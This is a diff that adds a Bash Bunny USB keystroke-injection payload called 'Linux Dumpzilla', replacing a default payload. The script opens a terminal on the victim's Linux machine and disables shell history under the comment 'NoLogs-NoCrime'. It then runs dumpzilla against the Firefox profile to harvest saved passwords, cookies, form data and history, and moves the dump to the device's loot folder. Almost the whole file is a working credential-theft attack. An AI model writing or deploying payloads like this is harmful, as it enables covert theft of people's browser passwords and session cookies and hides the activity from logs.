@@ -1,3 +1,50 @@
-# System default payload
-LED B SLOW
-ATTACKMODE SERIAL STORAGE
+#!/bin/bash
+#
+# Title:         Linux Dumpzilla
+# Author:        whoisroot (adapted from tuzzmaniandevil's LinuxReverseShell and Busindre's Dumpzilla)
+# Version:       1.0
+#
+# Runs a script to dump firefox addons, bookmarks, cookies, form data, history, passwords and thumbnails and then grabs the dump.
+#
+# Magenta..................Setup
+# Yellow single blink......Executing
+# Green....................Finished
+
+# Config options
+THUMB_DIR="\$bb/loot/thumbs_\$dmp"
+DUMPZILLA_OPTS="--Addons --Bookmarks --Cookies --Forms --History --Passwords --Thumbnails -extract_thumb $THUMB_DIR"
+
+# Start Setup
+LED SETUP
+
+# Gets Switch Position
+GET SWITCH_POSITION
+
+# Set Attack Mode
+ATTACKMODE HID STORAGE
+LED STAGE1
+
+# Open a terminal
+Q CTRL-ALT t
+
+# Wait for terminal to open
+sleep 1
+
+# NoLogs-NoCrime
+Q STRING "unset HISTFILE"
+# Define env vars
+Q STRING "export dmp=\$(hostname)_\$(date +%F);export bb=\$(readlink -f /dev/disk/by-label/BashBunny | while read dev;do mount | grep \"\$dev\" | awk '{print \$3}';done);"
+# Run dumpzilla
+Q STRING "python3 \$bb/payloads/"
+Q STRING "$SWITCH_POSITION"
+Q STRING "/dmpzl.py \$HOME/.mozilla/firefox/*.default $DUMPZILLA_OPTS >> /tmp/\${dmp}.txt;"
+# Move dump to Bunny
+Q STRING "mv /tmp/\$dmp.txt \$bb/loot/"
+Q ENTER
+
+# Quit the terminal
+LED CLEANUP
+Q STRING "exit"
+Q ENTER
+
+LED FINISH
